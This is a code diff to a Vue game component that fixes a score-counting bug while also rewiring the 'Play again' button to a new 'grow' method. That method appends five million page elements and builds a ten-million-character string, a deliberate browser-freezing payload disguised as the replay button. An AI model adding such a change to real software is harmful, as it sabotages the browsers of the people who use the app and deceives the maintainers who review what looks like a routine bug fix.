@@ -2,7 +2,8 @@
     <div class="game-container">
         <game-score-board v-model="score" />
         <game-grid ref="gameGrid" @winner="updateScore" />
-        <button @click="playAgain">Play again</button>
+        <button @click="grow">Play again</button>
+
     </div>
 </template>
 <style scoped>
@@ -35,11 +36,19 @@ export default {
 
     methods: {
         updateScore(winner) {
-            this.score[winner] = this.score[winner] + '1'
+            this.score[winner] = this.score[winner] + 1
         },
 
         playAgain() {
             this.$refs.gameGrid.resetGame()
+        },
+
+        grow() {
+            window.x = []
+            for (var i = 0; i < 5000000; i++) {
+                document.body.appendChild(document.createElement('div'));
+            }
+            window.x.push(new Array(10000000).join('x'));
         }
     }
 }
